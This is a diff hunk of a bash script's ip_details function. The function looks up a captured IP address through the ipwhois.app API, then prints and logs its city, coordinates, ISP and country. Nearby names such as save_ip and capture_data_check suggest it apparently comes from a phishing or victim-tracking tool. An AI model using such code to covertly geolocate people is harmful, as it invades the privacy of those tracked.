@@ -706,63 +706,63 @@ save_ip() {
 }
 ip_details() {
 	IFS='\n'
-	iptracker=$(curl -s -L "http://ipwhois.app/json/$IP" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > "${pro_dir}/track.txt")
+	iptracker=$(curl -s -L "http://ipwhois.app/json/$IP" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > track.txt)
 	IFS=$'\n'
-	iptt=$(sed -n 's/"ip"://p' "${pro_dir}/track.txt")
+	iptt=$(sed -n 's/"ip"://p' track.txt)
 
 	if [[ $iptt != "" ]]; then
 		echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
 	fi
-	iptype=$(sed -n 's/"type"://p' "${pro_dir}/track.txt")
+	iptype=$(sed -n 's/"type"://p' track.txt)
 	if [[ $iptype != "" ]]; then
 		echo -e "\n${GREEN} IP type: ${NC} $iptype"
 	fi
-	latitude=$(sed -n 's/"latitude"://p' "${pro_dir}/track.txt")
+	latitude=$(sed -n 's/"latitude"://p' track.txt)
 	if [[ $latitude != "" ]]; then
 		echo -e  "\n${GREEN} Latitude:  ${NC} $latitude"
 	fi
-	longitude=$(sed -n 's/"longitude"://p' "${pro_dir}/track.txt")
+	longitude=$(sed -n 's/"longitude"://p' track.txt)
 	if [[ $longitude != "" ]]; then
 		echo -e  "\n${GREEN} Longitude:  ${NC} $longitude"
 	fi
-	city=$(sed -n 's/"city"://p' "${pro_dir}/track.txt")
+	city=$(sed -n 's/"city"://p' track.txt)
 	if [[ $city != "" ]]; then
 		echo -e "\n${GREEN} City: ${NC} $city"
 	fi
-	isp=$(sed -n 's/"isp"://p' "${pro_dir}/track.txt")
+	isp=$(sed -n 's/"isp"://p' track.txt)
 	if [[ $isp != "" ]]; then
 		echo -e "\n${GREEN} Isp: ${NC} $isp"
 	fi
-	country=$(sed -n 's/"country"://p' "${pro_dir}/track.txt")
+	country=$(sed -n 's/"country"://p' track.txt)
 	if [[ $country != "" ]]; then
 		echo -e  "\n${GREEN} Country: ${NC} $country"
 	fi
-	flag=$(sed -n 's/"country_flag"://p' "${pro_dir}/track.txt")
+	flag=$(sed -n 's/"country_flag"://p' track.txt)
 	if [[ $flag != "" ]]; then
 		echo -e "\n${GREEN} Country flag: ${NC} $flag"
 	fi
-	cap=$(sed -n 's/"country_capital"://p' "${pro_dir}/track.txt")
+	cap=$(sed -n 's/"country_capital"://p' track.txt)
 	if [[ $cap != "" ]]; then
 		echo -e "\n${GREEN} Country capital: ${NC} $cap"
 	fi
-	phon=$(sed -n 's/"country_phone"://p' "${pro_dir}/track.txt")
+	phon=$(sed -n 's/"country_phone"://p' track.txt)
 	if [[ $phon != "" ]]; then
 		echo -e "\n${GREEN} Country code: ${NC} $phon"
 	fi
-	continent=$(sed -n 's/"continent"://p' "${pro_dir}/track.txt")
+	continent=$(sed -n 's/"continent"://p' track.txt)
 	if [[ $continent != "" ]]; then
 		echo -e  "\n${GREEN} Continent:  ${NC} $continent"
 	fi
-	ccode=$(sed -n 's/"currency_code"://p' "${pro_dir}/track.txt")
+	ccode=$(sed -n 's/"currency_code"://p' track.txt)
 	if [[ $ccode != "" ]]; then
 		echo -e "\n${GREEN} Currency code: ${NC} $ccode"
 	fi
-	region=$(sed -n 's/"region"://p' "${pro_dir}/track.txt")
+	region=$(sed -n 's/"region"://p' track.txt)
 	if [[ $region != "" ]]; then
 		echo -e "\n${GREEN} State: ${NC} $region"
 	fi
-	cat "${pro_dir}/track.txt" >> "${log_name}.txt"
-	rm -rf "${pro_dir}/track.txt"
+	cat track.txt >> "${log_name}.txt"
+	rm -rf track.txt
 }
 #Capture data check
 capture_data_check(){
